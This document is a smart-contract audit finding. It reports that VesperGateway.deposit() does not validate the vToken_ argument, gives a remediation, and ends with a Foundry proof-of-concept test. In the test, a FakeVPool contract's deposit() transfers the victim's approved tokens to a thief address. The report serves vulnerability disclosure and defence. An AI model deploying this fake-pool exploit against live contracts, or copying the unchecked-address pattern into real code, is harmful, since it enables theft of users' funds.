### Title
Unvalidated `vToken_` lets a fake Vesper pool steal approved underlying tokens - (`contracts/VesperGateway.sol`)

### Summary
`VesperGateway.deposit()` verifies that `pool_` is registered, but it does not verify that the attacker-supplied `vToken_` is a registered collateral before pulling its reported `underlying` token and granting that token’s allowance to `vToken_`. [1](#0-0)  The gateway then grants the malicious `vToken_` permission to spend the pulled underlying and calls its arbitrary `deposit()` implementation. [2](#0-1)  Because `Pool.depositTokenOf` is only populated when a governor adds a deposit token, an unregistered fake `vToken_` resolves to `address(0)`. [3](#0-2)  The final call to `IDepositToken(address(0)).deposit()` succeeds as an external call to an address with no code, so the earlier theft is not reverted. [4](#0-3) 

### Finding Description
An attacker can deploy a fake `IVPool` whose `token()` returns a valuable ERC20, such as USDC, and whose `deposit()` calls `underlying.transferFrom(msg.sender, attacker, amount_)`. [5](#0-4)  A victim following the normal gateway flow approves `VesperGateway` and calls `deposit(registeredPool, fakeVPool, amount)`. [6](#0-5)  The gateway transfers the victim’s underlying tokens to itself, approves the fake pool, and invokes `fakeVPool.deposit(amount)`, allowing the fake pool to move the tokens to the attacker. [7](#0-6)  Since the fake pool was never registered as collateral, `pool_.depositTokenOf(vToken_)` returns zero and no real `DepositToken.deposit()` validation executes. [8](#0-7) 

### Impact Explanation
This is direct theft of the caller’s underlying ERC20 in the same transaction. The attacker does not need a privileged role, a registered malicious collateral, oracle manipulation, or control of a legitimate Vesper pool. The registered-pool check protects only `pool_`; it does not establish that `vToken_` is one of that pool’s supported collateral assets. [6](#0-5) 

### Likelihood Explanation
The malicious contract is fully controlled by the attacker and only needs to implement `token()`, `approve()`, `balanceOf()`, and `deposit()` compatibly with `IVPool`. [9](#0-8)  The required victim interaction is the intended deposit flow: approve the gateway and submit a pool and vToken address. No protocol invariant or existing modifier detects the fake `vToken_` before the underlying transfer and approval. [10](#0-9) 

### Recommendation
Resolve `IDepositToken _depositToken = pool_.depositTokenOf(vToken_)` before transferring or approving any underlying token, and revert unless it is nonzero and `pool_.doesDepositTokenExist(_depositToken)` is true. [11](#0-10)  Keep the collateral lookup before the external `vToken_.token()` call or revalidate the resolved deposit token afterward so an arbitrary contract cannot substitute its underlying asset. After a legitimate deposit, reset the underlying allowance to zero and require a positive received `vToken` amount. [12](#0-11)

pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {VesperGateway} from "../contracts/VesperGateway.sol";
import {IERC20} from "../contracts/dependencies/openzeppelin/token/ERC20/IERC20.sol";
import {IDepositToken} from "../contracts/interfaces/IDepositToken.sol";
import {IPool} from "../contracts/interfaces/IPool.sol";
import {IPoolRegistry} from "../contracts/interfaces/IPoolRegistry.sol";
import {IVPool} from "../contracts/interfaces/external/IVPool.sol";
import {IOperator} from "../contracts/interfaces/IOperator.sol";

contract RegistryStub {
    function operator() external pure returns (IOperator) {
        return IOperator(address(0));
    }
}

contract PoolStub {
    function depositTokenOf(IERC20) external pure returns (IDepositToken) {
        return IDepositToken(address(0));
    }
}

contract TestToken is IERC20 {
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    uint256 public override totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract FakeVPool {
    TestToken public immutable underlying;
    address public immutable thief;

    constructor(TestToken underlying_, address thief_) {
        underlying = underlying_;
        thief = thief_;
    }

    function token() external view returns (address) {
        return address(underlying);
    }

    function deposit(uint256 amount) external {
        underlying.transferFrom(msg.sender, thief, amount);
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }
}

contract VesperGatewayFakeVPoolTest is Test {
    function testFakeVPoolDrainsApprovedUnderlying() public {
        address victim = address(0xA11CE);
        address thief = address(0xBAD);

        TestToken underlying = new TestToken();
        RegistryStub registry = new RegistryStub();
        PoolStub pool = new PoolStub();
        VesperGateway gateway =
            new VesperGateway(IPoolRegistry(address(registry)));
        FakeVPool fake = new FakeVPool(underlying, thief);

        uint256 amount = 100 ether;
        underlying.mint(victim, amount);

        vm.prank(victim);
        underlying.approve(address(gateway), amount);

        vm.prank(victim);
        gateway.deposit(
            IPool(address(pool)),
            IVPool(address(fake)),
            amount
        );

        assertEq(underlying.balanceOf(thief), amount);
        assertEq(underlying.balanceOf(victim), 0);
    }
}
